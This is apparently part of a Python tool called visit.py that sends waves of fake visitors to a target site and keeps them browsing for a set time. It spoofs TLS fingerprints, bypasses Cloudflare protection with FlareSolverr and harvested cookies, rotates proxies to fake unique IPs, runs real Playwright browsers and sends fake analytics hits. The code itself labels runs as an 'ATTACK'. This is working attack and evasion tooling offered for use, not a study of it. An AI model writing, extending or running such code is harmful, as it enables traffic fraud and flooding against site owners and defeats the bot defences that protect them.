    # Try curl_cffi direct bypass first (fast)
    if HAS_CFFI:
        try:
            r = smart_request(url, profile, proxy=proxy, timeout=20)
            
            # ADVANCED VERIFICATION
            success, reason = verify_visit_response(r)
            if success:
                cookies = dict(r.cookies)
                with lock:
                    stats["success"] += 1
                    stats["active_visitors"] += 1
                    stats["verified_visitors"] += 1
                    stats["unique_ips"] += 1
                    if stats["active_visitors"] > stats["peak_active"]:
                        stats["peak_active"] = stats["active_visitors"]
                    if stats["verified_visitors"] > stats["peak_verified"]:
                        stats["peak_verified"] = stats["verified_visitors"]
                log_progress()
                
                stay = STAY_TIME + random.randint(-5, 5)
                end_time = time.time() + max(stay, 15)
                
                while time.time() < end_time and not stop_event.is_set():
                    time.sleep(random.uniform(3, 8))
                    if time.time() >= end_time or stop_event.is_set(): break
                    page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                    try:
                        smart_request(site_info["base_url"] + page, profile, proxy=proxy,
                                    cookies=cookies, timeout=10)
                    except: pass
                
                with lock:
                    stats["active_visitors"] -= 1
                    stats["verified_visitors"] -= 1
                return True
            else:
                with lock: stats["blocked_visitors"] += 1
        except:
            pass
    
    # Fallback: FlareSolverr
    flare_port = 8191 + (vid % 20)
    try:
        payload = {"cmd": "request.get", "url": url, "maxTimeout": 30000}
        if proxy:
            payload["proxy"] = {"url": proxy}
        
        r = requests.post(f"http://localhost:{flare_port}/v1", json=payload, timeout=35)
        data = r.json()
        
        if data.get("status") == "ok":
            solution = data.get("solution", {})
            sol_html = solution.get("response", "")
            cookies = {c["name"]: c["value"] for c in solution.get("cookies", [])}
            ua = solution.get("userAgent", profile["ua"])
            
            # Verify FlareSolverr actually got real content
            flare_blocked = False
            if sol_html:
                sol_lower = sol_html.lower()
                for indicator in BLOCK_INDICATORS:
                    if indicator in sol_lower:
                        flare_blocked = True
                        break
            
            if not flare_blocked:
                with lock:
                    stats["success"] += 1
                    stats["active_visitors"] += 1
                    stats["verified_visitors"] += 1
                    stats["unique_ips"] += 1
                    if stats["active_visitors"] > stats["peak_active"]:
                        stats["peak_active"] = stats["active_visitors"]
                    if stats["verified_visitors"] > stats["peak_verified"]:
                        stats["peak_verified"] = stats["verified_visitors"]
                log_progress()
                
                stay = STAY_TIME + random.randint(-5, 5)
                end_time = time.time() + max(stay, 15)
                
                while time.time() < end_time and not stop_event.is_set():
                    time.sleep(random.uniform(5, 10))
                    if time.time() >= end_time or stop_event.is_set(): break
                    page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                    try:
                        smart_request(site_info["base_url"] + page, profile, proxy=proxy,
                                    cookies=cookies, timeout=10)
                    except: pass
                
                with lock:
                    stats["active_visitors"] -= 1
                    stats["verified_visitors"] -= 1
                return True
            else:
                with lock: stats["blocked_visitors"] += 1
    except:
        pass
    
    with lock: stats["failed"] += 1
    log_progress()
    return False


# ============ MODE C: PLAIN HTTP ============
def visitor_http(site_info, vid):
    """Direct HTTP with TLS spoofing for unprotected sites."""
    url = site_info["target_url"]
    fp, profile = gen_fingerprint()
    proxy = get_proxy_url()
    
    try:
        r = smart_request(url, profile, proxy=proxy, timeout=15)
        
        # ADVANCED VERIFICATION even for HTTP mode
        success, reason = verify_visit_response(r)
        if success:
            with lock:
                stats["success"] += 1
                stats["active_visitors"] += 1
                stats["verified_visitors"] += 1
                stats["unique_ips"] += 1
                if stats["active_visitors"] > stats["peak_active"]:
                    stats["peak_active"] = stats["active_visitors"]
                if stats["verified_visitors"] > stats["peak_verified"]:
                    stats["peak_verified"] = stats["verified_visitors"]
            log_progress()
            
            stay = STAY_TIME + random.randint(-5, 5)
            end_time = time.time() + max(stay, 15)
            
            while time.time() < end_time and not stop_event.is_set():
                time.sleep(random.uniform(3, 8))
                if time.time() >= end_time or stop_event.is_set(): break
                page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
                try:
                    smart_request(site_info["base_url"] + page, profile, proxy=proxy, timeout=10)
                except: pass
            
            with lock:
                stats["active_visitors"] -= 1
                stats["verified_visitors"] -= 1
            return True
        else:
            with lock:
                stats["failed"] += 1
                stats["blocked_visitors"] += 1
            log_progress(f"http_verify_fail:{reason[:25]}")
            return False
            
    except Exception as e:
        with lock: stats["failed"] += 1
        log_progress()
        return False


# ============ WAVE ENGINE ============
def visitor_dispatch(site_info, vid):
    mode = site_info["mode"]
    if mode == "socketio":
        result = visitor_socketio(site_info, vid)
    elif mode == "browser":
        # Browser mode uses persistent_visitor from browser_engine
        # This is handled separately in run_browser_wave, not here
        result = visitor_cloudflare(site_info, vid)  # Fallback if called directly
    elif mode == "cloudflare":
        result = visitor_cloudflare(site_info, vid)
    else:
        result = visitor_http(site_info, vid)
    
    # Send analytics hit if visit succeeded (NEW - silent, never breaks visits)
    if result and site_info.get("analytics", {}).get("type"):
        try:
            proxy = get_proxy_url()
            page = random.choice(site_info["pages"]) if site_info["pages"] else "/"
            send_analytics_hit(site_info["analytics"], page, site_info["analytics"]["hostname"], proxy=proxy)
        except:
            pass
    
    return result


def run_wave(wave_num, site_info):
    # For socketio mode through proxy, use micro-batches to avoid overwhelming the proxy
    actual_wave_size = WAVE_SIZE
    delay_between = 0.15
    
    if site_info['mode'] == 'socketio' and PROXY_USER:
        # Socket.IO through proxy - 5 visitors/wave with 3s delay
        # 9 servers x 5 visitors = 45 per wave cycle, spread with jitter
        # With full-duration stay = visitors accumulate over time
        actual_wave_size = min(WAVE_SIZE, 5)  # 5 visitors per wave per server
        delay_between = 3.0  # 3s between each connection
        # Random jitter at wave start to desync servers (0-10s)
        time.sleep(random.uniform(0, 10))
    
    print(f"\n🌊 Wave {wave_num+1}/{stats['total_waves']} - "
          f"Sending {actual_wave_size} visitors ({site_info['mode']}/{site_info['protection']})...", flush=True)
    
    threads = []
    for i in range(actual_wave_size):
        if stop_event.is_set(): break
        vid = wave_num * actual_wave_size + i
        t = threading.Thread(target=visitor_dispatch, args=(site_info, vid), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(delay_between)
    
    with lock: stats["waves_done"] += 1
    write_status()
    return threads


# ============ MAIN ============
def run(url, duration_min, manual_socket=None):
    # Install curl_cffi if not available
    global HAS_CFFI, cffi_requests
    if not HAS_CFFI:
        print("📦 Installing curl_cffi for TLS fingerprint spoofing...", flush=True)
        os.system("pip3 install curl_cffi -q 2>/dev/null")
        os.system("pip3 install curl_cffi --break-system-packages -q 2>/dev/null")
        try:
            from curl_cffi import requests as cffi_requests
            HAS_CFFI = True
            print("  ✅ curl_cffi installed!", flush=True)
        except:
            print("  ⚠️ curl_cffi not available, using regular requests", flush=True)
    
    # Detect site
    site_info = detect_site(url, manual_socket=manual_socket)
    
    # Override mode if FORCE_MODE is set (from Vercel scan result)
    force_mode = os.environ.get('FORCE_MODE', '').lower()
    if force_mode in ('browser', 'socketio', 'cloudflare', 'http'):
        print(f"  [OVERRIDE] Mode forced from panel: {site_info['mode']} -> {force_mode}", flush=True)
        site_info['mode'] = force_mode
    
    # Override protection if FORCE_PROTECTION is set
    force_prot = os.environ.get('FORCE_PROTECTION', '').lower()
    if force_prot:
        print(f"  [OVERRIDE] Protection forced from panel: {site_info['protection']} -> {force_prot}", flush=True)
        site_info['protection'] = force_prot
    
    stats["mode"] = f"{site_info['mode']}/{site_info['protection']}"
    
    # Install socketio if needed
    if site_info["mode"] == "socketio":
        try:
            import socketio
        except ImportError:
            print("📦 Installing python-socketio...", flush=True)
            os.system("pip3 install 'python-socketio[client]' websocket-client -q 2>/dev/null")
            os.system("pip3 install 'python-socketio[client]' websocket-client --break-system-packages -q 2>/dev/null")
    
    # Initialize Cloudflare cookies if needed
    if site_info["mode"] == "cloudflare":
        if not cf_cookie_cache["valid"]:
            init_cf_cookies(url)
    
    # BROWSER MODE: Install Playwright and start cookie harvester
    HAS_BROWSER = False
    if site_info["mode"] == "browser":
        try:
            from browser_engine import (
                install_playwright, is_playwright_available, 
                run_browser_wave, MAX_BROWSER_VISITORS
            )
            if not is_playwright_available():
                install_playwright()
            HAS_BROWSER = True
            print(f"  \u2705 Playwright ready - Browser mode active!", flush=True)
        except Exception as e:
            print(f"  \u26a0\ufe0f Browser mode failed ({e}), falling back to cloudflare mode", flush=True)
            site_info["mode"] = "cloudflare"
            if not cf_cookie_cache["valid"]:
                init_cf_cookies(url)
    
    # For socketio mode: skip Cloudflare check when proxy is available
    # The proxy + curl_cffi combination bypasses Cloudflare during registration
    # Socket.IO websocket transport also bypasses Cloudflare WAF
    if site_info["mode"] == "socketio" and site_info.get("socket_url") and not PROXY_USER:
        socket_host = site_info["socket_url"]
        try:
            test_r = requests.get(socket_host + "/socket.io/?EIO=4&transport=polling", timeout=10)
            if test_r.status_code == 403 and 'cloudflare' in test_r.text.lower():
                print(f"[WARN] Socket server {socket_host} is behind Cloudflare WAF, solving...", flush=True)
                if not cf_cookie_cache["valid"]:
                    init_cf_cookies(socket_host)
                if cf_cookie_cache["valid"]:
                    print(f"[OK] Got CF cookies for socket server", flush=True)
                else:
                    print(f"[WARN] Could not get CF cookies for socket server", flush=True)
        except:
            pass
    elif site_info["mode"] == "socketio" and PROXY_USER:
        print(f"[OK] Socket.IO with proxy - skipping CF check (proxy bypasses CF)", flush=True)
    
    # For socketio with proxy, use more frequent smaller waves
    if site_info['mode'] == 'socketio' and PROXY_USER:
        total_waves = max(1, duration_min * 4)  # 4 waves per minute
        WAVE_INTERVAL_ACTUAL = 15
    elif site_info['mode'] == 'browser':
        # Browser mode v3: Real Playwright browsers (heavy, ~400MB each)
        # 5 visitors per wave, every 30s, max 20 per server
        # All visitors STAY until time is up = accumulate real browsers
        total_waves = max(1, duration_min * 2)  # 2 waves per minute
        WAVE_INTERVAL_ACTUAL = 30
    else:
        total_waves = max(1, duration_min * 2)
        WAVE_INTERVAL_ACTUAL = WAVE_INTERVAL
    
    browser_wave_size = 5  # Visitors per wave in browser mode v3 (real Playwright, 8GB RAM)
    total_visits = total_waves * (browser_wave_size if site_info['mode'] == 'browser' else WAVE_SIZE)
    
    print(f"\n{'='*60}", flush=True)
    print(f"\U0001f680 TURBO v13 - HYBRID UNIVERSAL ENGINE", flush=True)
    print(f"Target: {url}", flush=True)
    print(f"Mode: {site_info['mode'].upper()}", flush=True)
    print(f"Protection: {site_info['protection'].upper()}", flush=True)
    if site_info['mode'] == 'browser':
        print(f"\U0001f310 BROWSER MODE v3: Real Playwright Browsers", flush=True)
        print(f"  Each visitor = real Chrome browser executing JavaScript", flush=True)
        print(f"  Visitors/wave: {browser_wave_size} (PERSISTENT - stay until end)", flush=True)
        print(f"  Max per server: 20 (safe for 8GB RAM)", flush=True)
        print(f"  Expected accumulation: ~{min(browser_wave_size * total_waves, 20)} active visitors", flush=True)
    else:
        tls_status = 'curl_cffi \u2705' if HAS_CFFI else 'No \u274c'
        print(f"TLS Spoof: {tls_status}", flush=True)
        print(f"Visitors/wave: {WAVE_SIZE} | Stay: {STAY_TIME}s", flush=True)
        print(f"Expected: ~{WAVE_SIZE} active visitors", flush=True)
    captcha_status = 'Yes \u2705' if CAPTCHA_API_KEY else 'No (set CAPTCHA_API_KEY)'
    print(f"CAPTCHA Solver: {captcha_status}", flush=True)
    if site_info['socket_url']:
        print(f"Socket: {site_info['socket_url']}", flush=True)
    if site_info['mode'] == 'cloudflare':
        print(f"CF Bypass: {cf_cookie_cache['mode'].upper()}", flush=True)
    print(f"Duration: {duration_min} min | Waves: {total_waves}", flush=True)
    print(f"Pages: {len(site_info['pages'])}", flush=True)
    print(f"Proxy: {'Yes' if PROXY_USER else 'No'}", flush=True)
    print(f"{'='*60}\n", flush=True)
    
    stats["start_time"] = time.time()
    os.environ['ATTACK_START_TIME'] = str(stats["start_time"])
    stats["target"] = total_visits
    stats["total_waves"] = total_waves
    stats["duration_min"] = duration_min
    stats["success"] = 0
    stats["failed"] = 0
    stats["active_visitors"] = 0
    stats["peak_active"] = 0
    stats["waves_done"] = 0
    stats["unique_ips"] = 0
    stats["verified_visitors"] = 0
    stats["blocked_visitors"] = 0
    stats["peak_verified"] = 0
    write_status()
    
    # ===== BROWSER MODE: Cookie Harvester + Persistent Visitors =====
    if site_info['mode'] == 'browser' and HAS_BROWSER:
        from browser_engine import run_browser_wave, MAX_BROWSER_VISITORS
        
        print(f"  \U0001f310 Browser v3: Launching real Playwright browsers (no cookie harvester needed)", flush=True)
        print(f"  \U0001f310 Each visitor = real Chrome executing JavaScript (NexaFlow compatible)", flush=True)
        
        # Launch waves of real browser visitors (they STAY until stop_event)
        for wave in range(total_waves):
            if stop_event.is_set(): break
            
            # Check if we hit the safe limit
            current_active = stats.get('active_visitors', 0)
            if current_active >= MAX_BROWSER_VISITORS:
                print(f"  \U0001f6e1\ufe0f Max browsers reached ({MAX_BROWSER_VISITORS}). "
                      f"Holding steady...", flush=True)
                for _ in range(WAVE_INTERVAL_ACTUAL):
                    if stop_event.is_set(): break
                    time.sleep(1)
                    write_status()
                with lock:
                    stats["waves_done"] += 1
                continue
            
            # Calculate how many more we can safely add
            remaining_slots = MAX_BROWSER_VISITORS - current_active
            actual_wave = min(browser_wave_size, remaining_slots)
            
            print(f"\n\U0001f30a Wave {wave+1}/{total_waves} - "
                  f"Launching {actual_wave} real browsers... "
                  f"({current_active} already active)", flush=True)
            
            launched = run_browser_wave(
                wave, site_info, stats, lock, stop_event, 
                wave_size=actual_wave
            )
            
            with lock:
                stats["waves_done"] += 1
            write_status()
            
            print(f"  \U0001f465 Active: {stats['active_visitors']} | "
                  f"\u2714\ufe0f Verified: {stats['verified_visitors']} | "
                  f"\U0001f680 Launched: {launched}", flush=True)
            
            if wave < total_waves - 1:
                print(f"  \u23f3 Next wave in {WAVE_INTERVAL_ACTUAL}s... "
                      f"(\U0001f465 {stats['active_visitors']} active browsers)", flush=True)
                for _ in range(WAVE_INTERVAL_ACTUAL):
                    if stop_event.is_set(): break
                    time.sleep(1)
        
        # All waves sent - visitors are STILL browsing with real browsers
        elapsed = time.time() - stats["start_time"]
        remaining = (duration_min * 60) - elapsed
        if remaining > 0 and not stop_event.is_set():
            print(f"\n\U0001f465 {stats['active_visitors']} real browsers active. "
                  f"Waiting {remaining:.0f}s until time expires...", flush=True)
            for _ in range(int(remaining)):
                if stop_event.is_set(): break
                time.sleep(1)
                if int(time.time() - stats["start_time"]) % 15 == 0:
                    write_status()
                    log_progress()
        
        # Signal all browser visitors to stop
        stop_event.set()
        print(f"\n\u23f3 Stopping {stats['active_visitors']} browsers...", flush=True)
        time.sleep(5)
        
        write_status()
        t_elapsed = time.time() - stats["start_time"]
        print(f"\n{'='*60}", flush=True)
        print(f"\U0001f3c1 DONE! Mode: BROWSER v3 (Real Playwright)", flush=True)
        print(f"\u2705 Total visits: {stats['success']} | \u274c Failed: {stats['failed']}", flush=True)
        print(f"\u2714\ufe0f Peak verified visitors: {stats['peak_verified']}", flush=True)
        print(f"\U0001f6ab Blocked: {stats['blocked_visitors']}", flush=True)
        if t_elapsed > 0:
            print(f"\u23f1\ufe0f {t_elapsed:.0f}s | \U0001f680{stats['success']/t_elapsed*60:.0f} visits/min", flush=True)
        print(f"\U0001f30d {stats['unique_ips']} unique IPs", flush=True)
        print(f"{'='*60}", flush=True)
        return  # Browser mode complete
    
    # ===== STANDARD MODES (socketio / cloudflare / http) =====
    all_threads = []
    for wave in range(total_waves):
        if stop_event.is_set(): break
        wave_threads = run_wave(wave, site_info)
        all_threads.extend(wave_threads)
        
        if wave < total_waves - 1:
            wait_time = WAVE_INTERVAL_ACTUAL
            print(f"  \u23f3 Next wave in {wait_time}s... (\U0001f465 {stats['active_visitors']} active)", flush=True)
            for _ in range(wait_time):
                if stop_event.is_set(): break
                time.sleep(1)
    
    print("\n\u23f3 Waiting for last visitors...", flush=True)
    join_timeout = duration_min * 60 + 30
    for t in all_threads[-WAVE_SIZE:]:
        t.join(timeout=join_timeout)
    
    write_status()
    t = time.time() - stats["start_time"]
    print(f"\n{'='*60}", flush=True)
    print(f"\U0001f3c1 DONE! \u2705{stats['success']}/{total_visits} \u274c{stats['failed']}", flush=True)
    if t > 0:
        print(f"\u23f1\ufe0f {t:.0f}s | \U0001f680{stats['success']/t*60:.0f}/min", flush=True)
    print(f"Mode: {site_info['mode']}/{site_info['protection']} | Peak: {stats['peak_active']} active", flush=True)
    print(f"\U0001f30d {stats['unique_ips']} unique IPs | TLS: {'curl_cffi' if HAS_CFFI else 'standard'}", flush=True)
    print(f"{'='*60}", flush=True)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 visit.py <URL> [duration_minutes] [socket_url]")
        sys.exit(1)
    target_url = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    manual_socket = sys.argv[3] if len(sys.argv) > 3 else os.environ.get("SOCKET_URL", "")
    run(target_url, duration, manual_socket=manual_socket if manual_socket else None)
